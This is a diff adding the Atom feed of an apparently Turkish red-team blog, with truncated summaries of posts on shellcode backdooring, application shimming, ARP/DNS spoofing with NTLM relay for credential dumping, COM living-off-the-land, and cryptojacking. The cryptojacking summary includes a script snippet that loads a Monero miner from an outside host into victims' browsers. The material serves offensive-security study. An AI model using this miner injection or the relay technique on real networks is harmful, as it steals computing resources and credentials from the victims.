@@ -1,0 +1,258 @@
+
+
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <id>http://192.168.1.40:4000/</id>
+  <title>Yugen</title>
+  <subtitle>mimikatzura, Red Teamer</subtitle>
+  <updated>2023-07-14T02:34:35+03:00</updated>
+  <author>
+    <name></name>
+    <uri>http://192.168.1.40:4000/</uri>
+  </author>
+  <link rel="self" type="application/atom+xml" href="http://192.168.1.40:4000/feed.xml"/>
+  <link rel="alternate" type="text/html" hreflang="en"
+    href="http://192.168.1.40:4000/"/>
+  <generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator>
+  <rights> © 2023  </rights>
+  <icon>/assets/img/favicons/favicon.ico</icon>
+  <logo>/assets/img/favicons/favicon-96x96.png</logo>
+
+
+  
+  <entry>
+    <title>Backdooring</title>
+    <link href="http://192.168.1.40:4000/posts/backdooring/" rel="alternate" type="text/html" title="Backdooring" />
+    <published>2023-07-14T00:00:00+03:00</published>
+  
+    <updated>2023-07-14T00:00:00+03:00</updated>
+  
+    <id>http://192.168.1.40:4000/posts/backdooring/</id>
+    <content src="http://192.168.1.40:4000/posts/backdooring/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="persistence" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      ASLR ve DEP korumalarının kapalı olması durumunda stack e shellcode yüklenip çalıştırılabilir.
+
+  ASLR, uygulamaların fonksiyon adreslerinin rastgele belirlenmesini ve bu rastgeleliğin sürekli devam etmesini sağlayan izolasyon mekanizmasıdır.
+
+
+  DEP,  stack üzerine veri yazılmasını/çalıştırılmasını engelleyen mekanizma.
+
+ASLR ve DEP korumalarının devre dışı olması durumunda genel olarak 2 şeki...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>Application Shimming</title>
+    <link href="http://192.168.1.40:4000/posts/application-shimming/" rel="alternate" type="text/html" title="Application Shimming" />
+    <published>2023-07-14T00:00:00+03:00</published>
+  
+    <updated>2023-07-14T00:00:00+03:00</updated>
+  
+    <id>http://192.168.1.40:4000/posts/application-shimming/</id>
+    <content src="http://192.168.1.40:4000/posts/application-shimming/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="persistence" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      Compatibility Administrator aracı ile yapılır. Gösterilen bir uygulamaya Injectdll yardımcısı ile dll yüklenir. Uygulama çalışırken eklenen dll ile birlikte yürütülür.
+
+
+
+  Uygulama seçilir
+
+
+
+
+
+  Parameters ile DLL yolu seçilir
+
+
+
+
+
+
+  Unselect all ile sağdaki liste kaldırılır
+
+
+
+
+  Install ile kurulur
+
+
+
+
+
+1337@empire:~$ msfconsole
+                                                  
+          ...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>ARP &amp; DNS Spoof + Ntlmrelay</title>
+    <link href="http://192.168.1.40:4000/posts/arp-dns-spoof-ntlmrelay/" rel="alternate" type="text/html" title="ARP &amp;amp; DNS Spoof + Ntlmrelay" />
+    <published>2023-07-13T00:00:00+03:00</published>
+  
+    <updated>2023-07-13T00:00:00+03:00</updated>
+  
+    <id>http://192.168.1.40:4000/posts/arp-dns-spoof-ntlmrelay/</id>
+    <content src="http://192.168.1.40:4000/posts/arp-dns-spoof-ntlmrelay/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="internal" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      Saldırgan, Arp spoof ile cihazların arp tablosunu değiştirir. Değiştirilen tabloda kendisini router olarak gösterir. Dns spoof ile spesifik A kayıtları spooflanır. karaca.com = 192.168.1.40  olacak şekilde  mitmf.conf düzenlenir ve ntlmrelay ile ntlmv2 hashler relay edilerek credentiallar dump edilir.
+
+  192.168.1.40 saldırgan IP adresi
+
+
+
+  Tekniğin çalışabilmesi için hedef cihazların DNS ayar...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>Enterprise Networklerde Coin Mining</title>
+    <link href="http://192.168.1.40:4000/posts/enterprise-networklerde-coin-mining/" rel="alternate" type="text/html" title="Enterprise Networklerde Coin Mining" />
+    <published>2023-07-12T00:00:00+03:00</published>
+  
+    <updated>2023-07-12T00:00:00+03:00</updated>
+  
+    <id>http://192.168.1.40:4000/posts/enterprise-networklerde-coin-mining/</id>
+    <content src="http://192.168.1.40:4000/posts/enterprise-networklerde-coin-mining/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="internal" />
+    
+    <category term="attacks" />
+    
+    <category term="monero" />
+    
+    <category term="coin" />
+    
+    <category term="XMR" />
+    
+    <category term="mining" />
+    
+    <category term="mitigate" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      Temelde ARP Spoof ile gerçekleşir. Saldırgan yerel ağda arp spoof başlatır. Saldırı sonucunda kendi mac adresi kurbanlar tarafından bilinir. Kendi vermiş olduğu javascript dosyasını kurban browserlar çalıştırır.
+&amp;lt;script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script&amp;gt;
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>COM Objects ve Living off the Land</title>
+    <link href="http://192.168.1.40:4000/posts/com-objects-ve-living-off-the-land/" rel="alternate" type="text/html" title="COM Objects ve Living off the Land" />
+    <published>2023-07-12T00:00:00+03:00</published>
+  
+    <updated>2023-07-12T00:00:00+03:00</updated>
+  
+    <id>http://192.168.1.40:4000/posts/com-objects-ve-living-off-the-land/</id>
+    <content src="http://192.168.1.40:4000/posts/com-objects-ve-living-off-the-land/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="persistence" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      
+  COM, kısaca binary interface olarak nitelendirilir. Yani çalıştırılabilir bir dosyanın, ya da bir ürünün geliştirme aşamasında kullanımını ve yeteneklerini genişletmek için çeşitli fonksiyonlar ile donatılmasıdır. Bu işlemleri yapabilmek için objeler geliştirilir ve bu objeler çeşitli amaçlar için kullanılabilir.
+
+
+Outlook uygulaması aktif edilir
+
+PS C:\Windows\system32&amp;gt; $com = [Type]::Ge...
+    </summary>
+  
+
+  </entry>
+
+</feed>
+
+
